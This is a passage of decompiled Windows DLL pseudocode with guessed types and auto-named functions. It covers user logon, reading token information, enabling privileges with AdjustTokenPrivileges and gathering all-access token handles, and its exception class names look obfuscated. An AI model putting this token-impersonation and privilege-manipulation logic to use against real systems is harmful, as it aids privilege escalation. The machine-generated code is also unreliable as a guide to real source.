              v12 = &v7[v10 + 1];
              if ( *v12 != 35 || lstrlenA(v12) <= 1 )
                return (char *)sub_100266E9(ModuleHandleA, v12);
            }
          }
        }
      }
    }
    return 0;
  }
  return &lp[*(_DWORD *)&v16[4 * *(unsigned __int16 *)&v13[2 * v18]]];
}
// 100266E9: using guessed type CHAR String1[264];

//----- (100268AE) --------------------------------------------------------
void __thiscall sub_100268AE(_DWORD *this)
{
  DWORD v2; // eax
  DWORD CurrentProcessId; // [esp-4h] [ebp-24h]

  *this = &off_100745B4;
  CurrentProcessId = GetCurrentProcessId();
  v2 = GetCurrentProcessId();
  sub_10025D50((int)(this + 1), (void *)0xFFFFFFFF, 0, 0, v2, CurrentProcessId);
}
// 100745B4: using guessed type int (__thiscall *off_100745B4)(void *, char);

//----- (100268EB) --------------------------------------------------------
_DWORD *__stdcall sub_100268EB(_DWORD *a1, void *a2)
{
  DWORD v2; // eax
  DWORD CurrentProcessId; // [esp-4h] [ebp-20h]

  *a1 = &off_100745B4;
  CurrentProcessId = GetCurrentProcessId();
  v2 = GetCurrentProcessId();
  sub_10025D50((int)(a1 + 1), a2, 0, 0, v2, CurrentProcessId);
  return a1;
}
// 100745B4: using guessed type int (__thiscall *off_100745B4)(void *, char);

//----- (10026929) --------------------------------------------------------
void __thiscall sub_10026929(_DWORD *this)
{
  *this = &off_100745B4;
  sub_1000F1E1(this + 1);
}
// 100745B4: using guessed type int (__thiscall *off_100745B4)(void *, char);

//----- (10026950) --------------------------------------------------------
int __stdcall sub_10026950(int a1, int a2, int a3, LPCWSTR lpszUsername, DWORD dwLogonType, DWORD dwLogonProvider)
{
  DWORD v6; // eax
  DWORD v7; // eax
  DWORD CurrentProcessId; // [esp-4h] [ebp-30h]
  DWORD v10; // [esp-4h] [ebp-30h]
  _DWORD pExceptionObject[3]; // [esp+10h] [ebp-1Ch] BYREF
  HANDLE phToken[4]; // [esp+1Ch] [ebp-10h] BYREF

  *(_DWORD *)a1 = &off_100745B4;
  CurrentProcessId = GetCurrentProcessId();
  v6 = GetCurrentProcessId();
  sub_10025D50(a1 + 4, (void *)0xFFFFFFFF, 0, 0, v6, CurrentProcessId);
  phToken[3] = 0;
  phToken[0] = 0;
  if ( !LogonUserW(
          *(LPCWSTR *)(*(_DWORD *)(a2 + 4) + 12),
          *(LPCWSTR *)(*(_DWORD *)(a3 + 4) + 12),
          *(LPCWSTR *)(*((_DWORD *)lpszUsername + 1) + 12),
          dwLogonType,
          dwLogonProvider,
          phToken) )
  {
    sub_1000E2E3(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  v10 = GetCurrentProcessId();
  v7 = GetCurrentProcessId();
  sub_10014EC9((HANDLE *)(a1 + 4), phToken[0], 0, 0, v7, v10);
  return a1;
}
// 100745B4: using guessed type int (__thiscall *off_100745B4)(void *, char);
// 10026950: using guessed type _DWORD pExceptionObject[3];

//----- (100269F8) --------------------------------------------------------
int __thiscall sub_100269F8(_DWORD *this)
{
  return this[2];
}

//----- (100269FC) --------------------------------------------------------
int __thiscall sub_100269FC(_DWORD *this)
{
  void *v1; // ecx
  _DWORD pExceptionObject[3]; // [esp+0h] [ebp-14h] BYREF
  int TokenInformation; // [esp+Ch] [ebp-8h] BYREF
  DWORD ReturnLength; // [esp+10h] [ebp-4h] BYREF

  v1 = (void *)this[2];
  ReturnLength = 0;
  if ( !GetTokenInformation(v1, TokenType, &TokenInformation, 4u, &ReturnLength) )
  {
    sub_1000E2E3(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  return TokenInformation;
}
// 100269FC: using guessed type _DWORD pExceptionObject[3];

//----- (10026A3D) --------------------------------------------------------
int __thiscall sub_10026A3D(_DWORD *this)
{
  void *v1; // ecx
  _DWORD pExceptionObject[3]; // [esp+0h] [ebp-14h] BYREF
  int TokenInformation; // [esp+Ch] [ebp-8h] BYREF
  DWORD ReturnLength; // [esp+10h] [ebp-4h] BYREF

  v1 = (void *)this[2];
  ReturnLength = 0;
  if ( !GetTokenInformation(v1, TokenImpersonationLevel, &TokenInformation, 4u, &ReturnLength) )
  {
    sub_1000E2E3(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  return TokenInformation;
}
// 10026A3D: using guessed type _DWORD pExceptionObject[3];

//----- (10026A7E) --------------------------------------------------------
void __userpurge sub_10026A7E(int a1@<eax>, int a2)
{
  void *v2; // edi
  DWORD v3; // eax
  DWORD CurrentProcessId; // [esp-4h] [ebp-Ch]

  v2 = *(void **)(a1 + 8);
  CurrentProcessId = GetCurrentProcessId();
  v3 = GetCurrentProcessId();
  sub_10014EC9((HANDLE *)(a2 + 4), v2, 1, 0, v3, CurrentProcessId);
}

//----- (10026AA8) --------------------------------------------------------
_DWORD *__stdcall sub_10026AA8(_DWORD *a1, int a2)
{
  DWORD v2; // eax
  DWORD CurrentProcessId; // [esp-4h] [ebp-20h]

  *a1 = &off_100745B4;
  CurrentProcessId = GetCurrentProcessId();
  v2 = GetCurrentProcessId();
  sub_10025D50((int)(a1 + 1), (void *)0xFFFFFFFF, 0, 0, v2, CurrentProcessId);
  sub_10026A7E(a2, (int)a1);
  return a1;
}
// 100745B4: using guessed type int (__thiscall *off_100745B4)(void *, char);

//----- (10026AF2) --------------------------------------------------------
int __userpurge sub_10026AF2@<eax>(int a1@<eax>, int a2)
{
  if ( a2 != a1 )
    sub_10026A7E(a1, a2);
  return a2;
}

//----- (10026B09) --------------------------------------------------------
_DWORD *__thiscall sub_10026B09(_DWORD *this, _DWORD *a2)
{
  void *v3; // edi
  void *v4; // eax
  void *v5; // eax
  void *v7; // [esp-14h] [ebp-58h]
  DWORD v8; // [esp-8h] [ebp-4Ch]
  int v9[5]; // [esp+10h] [ebp-34h] BYREF
  HLOCAL pExceptionObject[2]; // [esp+24h] [ebp-20h] BYREF
  char v11; // [esp+2Ch] [ebp-18h]
  int v12; // [esp+30h] [ebp-14h]
  DWORD ReturnLength[3]; // [esp+34h] [ebp-10h] BYREF
  int v14; // [esp+40h] [ebp-4h]

  v12 = 0;
  v7 = (void *)this[2];
  ReturnLength[0] = 0;
  if ( GetTokenInformation(v7, TokenUser, 0, 0, ReturnLength)
    || GetLastError() != 122
    || (sub_1000C28D((void *)ReturnLength[0], (int)v9, 0),
        v14 = 1,
        v3 = (void *)this[2],
        v8 = v9[3],
        v4 = (void *)sub_1000C50A(v9),
        !GetTokenInformation(v3, TokenUser, v4, v8, ReturnLength)) )
  {
    sub_1000E2E3(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  *(_BYTE *)(v9[1] + 8) = 1;
  v5 = *(void **)sub_1000C52E(v9);
  pExceptionObject[0] = off_10074CC8;
  pExceptionObject[1] = v5;
  v11 = 0;
  LOBYTE(v14) = 2;
  sub_1002FFA3((int)pExceptionObject, a2);
  v12 = 1;
  LOBYTE(v14) = 1;
  sub_1002FF72(pExceptionObject);
  LOBYTE(v14) = 0;
  sub_1000C45D(v9);
  return a2;
}
// 10074CC8: using guessed type int (__thiscall *off_10074CC8[2])(void *Block, char);

//----- (10026BDE) --------------------------------------------------------
int *__cdecl sub_10026BDE(int *a1)
{
  _DWORD *v1; // eax
  _DWORD *v2; // eax
  wchar_t *v3; // eax
  _DWORD *v4; // eax
  bool v5; // bl
  _DWORD *v6; // eax
  wchar_t *v7; // eax
  wchar_t *v8; // eax
  bool v9; // bl
  int v10; // eax
  _DWORD *v11; // eax
  int v13[5]; // [esp+10h] [ebp-88h] BYREF
  int v14[4]; // [esp+24h] [ebp-74h] BYREF
  int v15; // [esp+34h] [ebp-64h]
  HLOCAL v16[3]; // [esp+38h] [ebp-60h] BYREF
  int v17[3]; // [esp+44h] [ebp-54h] BYREF
  int v18[3]; // [esp+50h] [ebp-48h] BYREF
  int v19[2]; // [esp+5Ch] [ebp-3Ch] BYREF
  int v20[2]; // [esp+64h] [ebp-34h] BYREF
  int v21[2]; // [esp+6Ch] [ebp-2Ch] BYREF
  int v22[2]; // [esp+74h] [ebp-24h] BYREF
  int v23[2]; // [esp+7Ch] [ebp-1Ch] BYREF
  int v24; // [esp+84h] [ebp-14h]
  int v25; // [esp+94h] [ebp-4h]

  sub_10006715(a1);
  v24 = 1;
  sub_1000922C();
  v1 = operator new(8u);
  v23[1] = (int)v1;
  v25 = 1;
  if ( v1 )
    v2 = sub_1001CC57(v1);
  else
    v2 = 0;
  LOBYTE(v25) = 0;
  sub_1001DEAB((_DWORD *)dword_10091D5C, (int)v2);
  v3 = (wchar_t *)sub_1000BE16((int)&unk_1008E7A8);
  sub_10009D2C(v23, v3);
  v25 = 2;
  sub_1001DD41(v18, (int)v23);
  LOBYTE(v25) = 4;
  sub_10009F65(v23);
  sub_1001EA29((int)v18, v14);
  LOBYTE(v25) = 5;
  while ( 1 )
  {
    v4 = sub_1001EA64((int)v18, v13);
    LOBYTE(v25) = 6;
    v5 = !sub_1001EA02((int)v4, (int)v14);
    LOBYTE(v25) = 5;
    sub_1001E91D(v13);
    if ( !v5 )
      break;
    sub_1001E9BB(v14, v17);
    LOBYTE(v25) = 7;
    v6 = sub_1001E4E1(v17, v20);
    LOBYTE(v25) = 8;
    sub_1000BA21(v23, (int)v6);
    LOBYTE(v25) = 10;
    sub_10009F65(v20);
    v7 = (wchar_t *)sub_1000BE16((int)&unk_1008E7D8);
    sub_10009D2C(v21, v7);
    LOBYTE(v25) = 11;
    v24 |= 2u;
    v9 = 0;
    if ( !sub_1000A959((int)v21, (int)v23) )
    {
      v8 = (wchar_t *)sub_1000BE16((int)&unk_1008E810);
      sub_10009D2C(v22, v8);
      v25 = 12;
      v24 |= 4u;
      if ( sub_1000A9B5((int)v22, (int)v23, 0) == -1 )
        v9 = 1;
    }
    v25 = 11;
    if ( (v24 & 4) != 0 )
    {
      v24 &= ~4u;
      sub_10009F65(v22);
    }
    v25 = 10;
    if ( (v24 & 2) != 0 )
    {
      v24 &= ~2u;
      sub_10009F65(v21);
    }
    if ( v9 )
    {
      LOBYTE(v25) = 13;
      v10 = sub_1002FF1D((int)v23, (int)v16);
      LOBYTE(v25) = 14;
      v11 = sub_1002FFA3(v10, v19);
      LOBYTE(v25) = 15;
      sub_100023AB(a1, (int)v11);
      LOBYTE(v25) = 14;
      sub_10009F65(v19);
      LOBYTE(v25) = 13;
      sub_1002FF72(v16);
      v25 = 10;
    }
    LOBYTE(v25) = 7;
    sub_1000BA51(v23);
    LOBYTE(v25) = 5;
    sub_1001DFCF(v17);
    ++v15;
  }
  LOBYTE(v25) = 4;
  sub_1001E91D(v14);
  LOBYTE(v25) = 0;
  sub_1001DFCF(v18);
  return a1;
}
// 10091D5C: using guessed type int dword_10091D5C;
// 10026BDE: using guessed type int var_48[3];
// 10026BDE: using guessed type int var_74[4];
// 10026BDE: using guessed type int var_88[5];
// 10026BDE: using guessed type int var_54[3];
// 10026BDE: using guessed type HLOCAL var_60[3];

//----- (10026E26) --------------------------------------------------------
int *__cdecl sub_10026E26(int *a1)
{
  unsigned int i; // edi
  int v2; // eax
  _DWORD *v3; // eax
  _DWORD *v4; // esi
  int v5; // eax
  unsigned int j; // esi
  DWORD v7; // ebx
  _DWORD *v8; // eax
  int v9; // eax
  int v11[3]; // [esp+10h] [ebp-4Ch] BYREF
  unsigned int v12; // [esp+1Ch] [ebp-40h]
  int v13[3]; // [esp+20h] [ebp-3Ch] BYREF
  unsigned int v14; // [esp+2Ch] [ebp-30h]
  int v15; // [esp+30h] [ebp-2Ch] BYREF
  int v16[2]; // [esp+34h] [ebp-28h] BYREF
  int v17; // [esp+3Ch] [ebp-20h] BYREF
  int v18[3]; // [esp+40h] [ebp-1Ch] BYREF
  bool v19; // [esp+4Fh] [ebp-Dh]
  int v20; // [esp+58h] [ebp-4h]

  sub_10027925(a1);
  v20 = 0;
  v18[2] = 1;
  sub_10015379(v11);
  v20 = 1;
  sub_100281D7(v13);
  LOBYTE(v20) = 2;
  for ( i = 0; i < v14; ++i )
  {
    v2 = (*(int (__thiscall **)(int *, unsigned int))(v13[0] + 44))(v13, i);
    v3 = sub_100281A2(v2, v16);
    LOBYTE(v20) = 3;
    v4 = sub_1000BA21(v18, (int)v3);
    LOBYTE(v20) = 4;
    v19 = sub_1000A9B5((int)&unk_100955E8, (int)v4, 0) != -1;
    LOBYTE(v20) = 3;
    sub_1000BA51(v18);
    LOBYTE(v20) = 2;
    sub_10009F65(v16);
    if ( v19 )
    {
      v5 = (*(int (__thiscall **)(int *, unsigned int))(v13[0] + 44))(v13, i);
      sub_10015682(v11, v5);
    }
  }
  for ( j = 0; j < v12; ++j )
  {
    v7 = *(_DWORD *)(*(int (__thiscall **)(int *, unsigned int))(v11[0] + 44))(v11, j);
    v8 = sub_1001EE7C(v7, &v17, 0x400u);
    LOBYTE(v20) = 5;
    v9 = (*(int (__thiscall **)(_DWORD *, int *, int))(*v8 + 32))(v8, &v15, 983551);
    LOBYTE(v20) = 6;
    sub_10027A89(a1, v9);
    LOBYTE(v20) = 5;
    sub_10026929(&v15);
    LOBYTE(v20) = 2;
    sub_10009696(&v17);
  }
  LOBYTE(v20) = 1;
  sub_100153B0(v13);
  LOBYTE(v20) = 0;
  sub_100153B0(v11);
  return a1;
}

//----- (10026F63) --------------------------------------------------------
DWORD __thiscall sub_10026F63(void *this, int a2)
{
  return sub_10026F87(1, (int)this, a2);
}

//----- (10026F75) --------------------------------------------------------
DWORD __thiscall sub_10026F75(void *this, int a2)
{
  return sub_10026F87(0, (int)this, a2);
}

//----- (10026F87) --------------------------------------------------------
DWORD __userpurge sub_10026F87@<eax>(char a1@<al>, int a2, int a3)
{
  DWORD result; // eax
  void *v5; // [esp-18h] [ebp-48h]
  struct _TOKEN_PRIVILEGES NewState; // [esp+Ch] [ebp-24h] BYREF
  _DWORD pExceptionObject[3]; // [esp+1Ch] [ebp-14h] BYREF
  struct _LUID Luid; // [esp+28h] [ebp-8h] BYREF

  Luid.LowPart = 0;
  Luid.HighPart = 0;
  memset(&NewState, 0, sizeof(NewState));
  if ( !LookupPrivilegeValueW(0, *(LPCWSTR *)(*(_DWORD *)(a3 + 4) + 12), &Luid)
    || (NewState.Privileges[0].Luid = Luid,
        v5 = *(void **)(a2 + 8),
        NewState.PrivilegeCount = 1,
        NewState.Privileges[0].Attributes = a1 != 0 ? 2 : 0,
        !AdjustTokenPrivileges(v5, 0, &NewState, 0x10u, 0, 0))
    || (result = GetLastError()) != 0 )
  {
    sub_1000E2E3(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  return result;
}
// 10026F87: using guessed type _DWORD pExceptionObject[3];

//----- (10027021) --------------------------------------------------------
_DWORD *__thiscall sub_10027021(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0xCu);
  if ( v3 )
    v4 = sub_100275A7(this, v3, 0);
  else
    v4 = 0;
  sub_10027EAF(a2, (int)v4);
  return a2;
}

//----- (10027074) --------------------------------------------------------
_DWORD *__thiscall sub_10027074(void *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax

  v3 = operator new(0xCu);
  if ( v3 )
    v4 = sub_10027711(this, v3, 0);
  else
    v4 = 0;
  sub_10027F33(a2, (int)v4);
  return a2;
}

//----- (100270C7) --------------------------------------------------------
_DWORD *__thiscall sub_100270C7(void *this, _DWORD *a2)
{
  int v3; // eax
  _DWORD *v4; // eax
  _DWORD *Block; // [esp+14h] [ebp-10h]

  Block = operator new(0xCu);
  if ( Block )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
    v4 = sub_100275A7(this, Block, v3);
  }
  else
  {
    v4 = 0;
  }
  sub_10027EAF(a2, (int)v4);
  return a2;
}

//----- (10027122) --------------------------------------------------------
_DWORD *__thiscall sub_10027122(void *this, _DWORD *a2)
{
  int v3; // eax
  _DWORD *v4; // eax
  _DWORD *Block; // [esp+14h] [ebp-10h]

  Block = operator new(0xCu);
  if ( Block )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
    v4 = sub_10027711(this, Block, v3);
  }
  else
  {
    v4 = 0;
  }
  sub_10027F33(a2, (int)v4);
  return a2;
}

//----- (1002717D) --------------------------------------------------------
_DWORD *__thiscall sub_1002717D(void *this, _DWORD *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v5 = operator new(0xCu);
  if ( v5 )
    v6 = sub_100275A7(this, v5, pExceptionObject);
  else
    v6 = 0;
  sub_10027EAF(a2, (int)v6);
  return a2;
}

//----- (100271F2) --------------------------------------------------------
_DWORD *__thiscall sub_100271F2(void *this, _DWORD *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v5 = operator new(0xCu);
  if ( v5 )
    v6 = sub_10027711(this, v5, pExceptionObject);
  else
    v6 = 0;
  sub_10027F33(a2, (int)v6);
  return a2;
}

//----- (10027267) --------------------------------------------------------
void __thiscall sub_10027267(_DWORD *this)
{
  *this = &off_1007462C;
  *this = off_10072944;
}
// 10072944: using guessed type int (__thiscall *off_10072944[2])(void *Block, char);
// 1007462C: using guessed type int (__thiscall *off_1007462C)(void *Block, char);

//----- (1002728C) --------------------------------------------------------
int *__thiscall sub_1002728C(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_10027532(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 100272E2: variable 'v5' is possibly undefined

//----- (100272F4) --------------------------------------------------------
int *__thiscall sub_100272F4(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 8))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_10027576(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 1002734A: variable 'v5' is possibly undefined

//----- (1002735C) --------------------------------------------------------
void __thiscall sub_1002735C(void *this, int a2)
{
  int v2[4]; // [esp+10h] [ebp-14h] BYREF
  int v3; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 20))(this, v2);
  v3 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v2[0] + 28))(v2[0], a2);
  v3 = -1;
  sub_10027EEE(v2);
}

//----- (10027394) --------------------------------------------------------
void __thiscall sub_10027394(void *this, int a2, int a3)
{
  int v3[4]; // [esp+10h] [ebp-14h] BYREF
  int v4; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v3, a3);
  v4 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v3[0] + 28))(v3[0], a2);
  v4 = -1;
  sub_10027EEE(v3);
}

//----- (100273CF) --------------------------------------------------------
void __thiscall sub_100273CF(void *this, int a2)
{
  int v2[4]; // [esp+10h] [ebp-14h] BYREF
  int v3; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v2, a2);
  v3 = 0;
  (*(void (__thiscall **)(int))(*(_DWORD *)v2[0] + 24))(v2[0]);
  v3 = -1;
  sub_10027EEE(v2);
}

//----- (10027407) --------------------------------------------------------
int __thiscall sub_10027407(void *this, int a2)
{
  int v2; // esi
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 24))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_10027F72(v4);
  return v2;
}

//----- (10027443) --------------------------------------------------------
int __thiscall sub_10027443(void *this, int a2)
{
  int v2; // esi
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_10027EEE(v4);
  return v2;
}

//----- (1002747F) --------------------------------------------------------
void __thiscall sub_1002747F(void *this)
{
  int v1[4]; // [esp+10h] [ebp-14h] BYREF
  int v2; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, v1);
  v2 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v1[0] + 4))(v1[0]) )
    (*(void (__thiscall **)(int))(*(_DWORD *)v1[0] + 24))(v1[0]);
  v2 = -1;
  sub_10027EEE(v1);
}

//----- (100274CE) --------------------------------------------------------
_DWORD *__thiscall sub_100274CE(_DWORD *Block, char a2)
{
  sub_10027267(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100274ED) --------------------------------------------------------
_DWORD *__thiscall sub_100274ED(_DWORD *Block, char a2)
{
  *Block = &off_10074664;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10074664: using guessed type int (__thiscall *off_10074664)(void *Block, char);

//----- (1002750D) --------------------------------------------------------
_DWORD *__thiscall sub_1002750D(_DWORD *Block, char a2)
{
  *Block = &off_10074684;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10074684: using guessed type int (__thiscall *off_10074684)(void *Block, char);

//----- (10027532) --------------------------------------------------------
int __usercall sub_10027532@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (10027576) --------------------------------------------------------
int __usercall sub_10027576@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (100275A7) --------------------------------------------------------
_DWORD *__thiscall sub_100275A7(void *this, _DWORD *a2, int a3)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_10074664;
  a2[1] = this;
  *a2 = &off_100746A4;
  a2[2] = a3;
  return result;
}
// 10074664: using guessed type int (__thiscall *off_10074664)(void *Block, char);
// 100746A4: using guessed type int (__thiscall *off_100746A4)(void *Block, char);

//----- (100275DB) --------------------------------------------------------
void __thiscall sub_100275DB(_DWORD *this)
{
  *this = &off_100746A4;
  *this = &off_10074664;
}
// 10074664: using guessed type int (__thiscall *off_10074664)(void *Block, char);
// 100746A4: using guessed type int (__thiscall *off_100746A4)(void *Block, char);

//----- (10027600) --------------------------------------------------------
bool __thiscall sub_10027600(int this)
{
  return *(_DWORD *)(this + 8) == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (10027617) --------------------------------------------------------
BOOL __thiscall sub_10027617(_DWORD *this)
{
  return this[2] != 0;
}

//----- (10027621) --------------------------------------------------------
int __thiscall sub_10027621(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 44))(*(_DWORD *)(this + 4), v2);
}

//----- (1002765C) --------------------------------------------------------
int __thiscall sub_1002765C(int this)
{
  int v2; // edi
  int result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  result = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
  if ( v2 == result )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  *(_DWORD *)(this + 8) = v2 + 1;
  return result;
}

//----- (10027692) --------------------------------------------------------
int __thiscall sub_10027692(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  result = v1 - 1;
  this[2] = result;
  return result;
}

//----- (100276BA) --------------------------------------------------------
int __thiscall sub_100276BA(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 40))(*(_DWORD *)(this + 4), v2);
}

//----- (100276F5) --------------------------------------------------------
int __thiscall sub_100276F5(int this, int a2)
{
  int v2; // eax

  v2 = *(_DWORD *)(this + 8);
  *(_DWORD *)(this + 8) = v2 + 1;
  return (*(int (__thiscall **)(_DWORD, int, int))(**(_DWORD **)(this + 4) + 32))(*(_DWORD *)(this + 4), a2, v2);
}

//----- (10027711) --------------------------------------------------------
_DWORD *__thiscall sub_10027711(void *this, _DWORD *a2, int a3)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_10074684;
  a2[1] = this;
  *a2 = &off_100746C4;
  a2[2] = a3;
  return result;
}
// 10074684: using guessed type int (__thiscall *off_10074684)(void *Block, char);
// 100746C4: using guessed type int (__thiscall *off_100746C4)(void *Block, char);

//----- (10027745) --------------------------------------------------------
void __thiscall sub_10027745(_DWORD *this)
{
  *this = &off_100746C4;
  *this = &off_10074684;
}
// 10074684: using guessed type int (__thiscall *off_10074684)(void *Block, char);
// 100746C4: using guessed type int (__thiscall *off_100746C4)(void *Block, char);

//----- (1002776A) --------------------------------------------------------
bool __thiscall sub_1002776A(int this)
{
  return *(_DWORD *)(this + 8) == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4));
}

//----- (10027781) --------------------------------------------------------
BOOL __thiscall sub_10027781(_DWORD *this)
{
  return this[2] != 0;
}

//----- (1002778B) --------------------------------------------------------
int __thiscall sub_1002778B(int this)
{
  int v2; // edi
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 8);
  if ( v2 == (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 4) + 4))(*(_DWORD *)(this + 4)) )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return (*(int (__thiscall **)(_DWORD, int))(**(_DWORD **)(this + 4) + 44))(*(_DWORD *)(this + 4), v2);
}

//----- (100277C6) --------------------------------------------------------
